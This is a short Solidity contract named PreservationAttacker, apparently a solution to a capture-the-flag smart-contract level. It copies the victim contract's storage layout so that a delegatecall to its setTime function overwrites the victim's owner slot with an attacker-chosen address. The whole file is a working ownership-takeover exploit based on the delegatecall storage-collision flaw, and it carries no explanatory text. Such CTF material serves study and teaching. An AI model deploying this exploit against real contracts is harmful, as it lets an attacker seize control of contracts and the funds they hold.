pragma solidity ^0.8.4;

contract PreservationAttacker {
    
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    
    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}